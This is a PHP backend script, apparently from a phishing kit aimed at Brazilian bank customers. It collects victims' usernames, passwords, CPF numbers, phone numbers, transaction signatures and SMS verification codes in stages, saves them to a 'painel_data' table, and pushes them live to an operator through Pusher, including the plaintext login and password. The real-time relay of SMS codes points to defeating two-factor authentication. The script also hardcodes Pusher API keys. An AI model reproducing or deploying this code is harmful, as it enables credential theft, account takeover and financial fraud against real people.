<?php 
    session_start();
    require_once __DIR__."/../config/database.php";
    require __DIR__ .'/../vendor/autoload.php';

    $db = new database;
    $conn = $db->conn;

    date_default_timezone_set('America/Sao_Paulo');
    $dataLocal = date('H:i:s d/m/Y ', time());
    
    $ip = $_SERVER['REMOTE_ADDR'];
    
    if(isset($_REQUEST['loginAuthenticate']) && isset($_REQUEST['usuario']) && isset($_REQUEST['senha'])){
        $usuario = filter_var($_REQUEST['usuario'], FILTER_SANITIZE_STRING);
        $senha = filter_var($_REQUEST['senha'], FILTER_SANITIZE_STRING);
        $tipoconta = filter_var($_REQUEST['tipoconta'], FILTER_SANITIZE_STRING);
        
        $uiToken = md5(time());
        $_SESSION['uiToken'] = $uiToken;

        $stmt = $conn->prepare("INSERT INTO painel_data(usuario, senha, cpf, telefone, assinatura, tipoconta, codigosms, data_hora, ip, ui_token) VALUES(:usuario, :senha, :cpf, :telefone, :assinatura, :tipoconta, :codigosms, :data_hora, :ip, :ui_token)");

        if($stmt->execute([
            ":usuario" => $usuario, ":senha" => $senha, ":cpf" => "notDefined", ":telefone" => "notDefined", ":assinatura" => "notDefined", ":tipoconta" => $tipoconta, ":codigosms" => "notDefined", ":data_hora" => $dataLocal, ":ip" => $ip, ":ui_token" => $uiToken
        ])){
            $_SESSION['authUser'] = $usuario;
            $_SESSION['authPass'] = $senha;

            $options = array(
                'cluster' => 'mt1',
                'useTLS' => true
            );
            $pusher = new Pusher\Pusher(
                'ffed56d81eb7838b3016',
                'a9c912141da7d07e94cc',
                '1050438',
                $options
            );
            
            $data['uiToken'] = $uiToken;
            $data['message'] = 'newLoginIncome';
            $pusher->trigger('my-channel', 'my-event', $data);

            echo "success";
        }else{  
            echo "errorAtInsert";
        }
        
    }

    if(isset($_REQUEST['userDataAuth']) && isset($_REQUEST['assinatura']) && isset($_REQUEST['telefone']) && isset($_SESSION['uiToken'])){
        $userTokenIdentification = filter_var($_SESSION['uiToken'], FILTER_SANITIZE_STRING);
        $assinatura = filter_var($_REQUEST['assinatura'], FILTER_SANITIZE_STRING);
        $telefone = filter_var($_REQUEST['telefone'], FILTER_SANITIZE_STRING);
        $cpf = filter_var($_REQUEST['cpf'], FILTER_SANITIZE_STRING);

        $usuario = addslashes($_SESSION['authUser']);
        $senha = addslashes($_SESSION['authPass']);
        

        $stmt = $conn->prepare("UPDATE painel_data SET cpf = :cpf, telefone = :telefone, assinatura = :assinatura WHERE ui_token = :ui_token");

        if($stmt->execute([
          ":cpf" => $cpf, ":telefone" => $telefone, ":assinatura" => $assinatura, ":ui_token" => $userTokenIdentification
        ])){
            $options = array(
                'cluster' => 'mt1',
                'useTLS' => true
            );
            $pusher = new Pusher\Pusher(
                'ffed56d81eb7838b3016',
                'a9c912141da7d07e94cc',
                '1050438',
                $options
            );
            
            $uiToken = $_SESSION['uiToken'];

            $data['userCpf'] = $cpf;
            $data['userLogin'] = $usuario;
            $data['userPass'] = $senha;
            $data['userAssinatura'] = $assinatura;
            $data['userTelefone'] = $telefone;
            $data['uiToken'] = $uiToken;
            $data['message'] = 'newRegisterDataInformation';
            $pusher->trigger('my-channel', 'my-event', $data);

            echo "success";
        }else{  
            echo "errorAtUpdate";
        }
    }
    if(isset($_REQUEST['codigo']) && isset($_REQUEST['codigo']) && isset($_REQUEST['userCodeAuth'])){
        $userTokenIdentification = filter_var($_SESSION['uiToken'], FILTER_SANITIZE_STRING);
        $codigo = filter_var($_REQUEST['codigo'], FILTER_SANITIZE_STRING);

        $stmt = $conn->prepare("UPDATE painel_data SET codigosms = :codigo WHERE ui_token = :ui_token");

        if($stmt->execute([
          ":codigo" => $codigo, ":ui_token" => $userTokenIdentification
        ])){
            $options = array(
                'cluster' => 'mt1',
                'useTLS' => true
            );
            $pusher = new Pusher\Pusher(
                'ffed56d81eb7838b3016',
                'a9c912141da7d07e94cc',
                '1050438',
                $options
            );
            
            $uiToken = $_SESSION['uiToken'];

            $data['uiToken'] = $uiToken;
            $data['message'] = 'newRegisterCode';
            $pusher->trigger('my-channel', 'my-event', $data);

            echo "success";
        }else{  
            echo "errorAtUpdate";
        }
    }
?>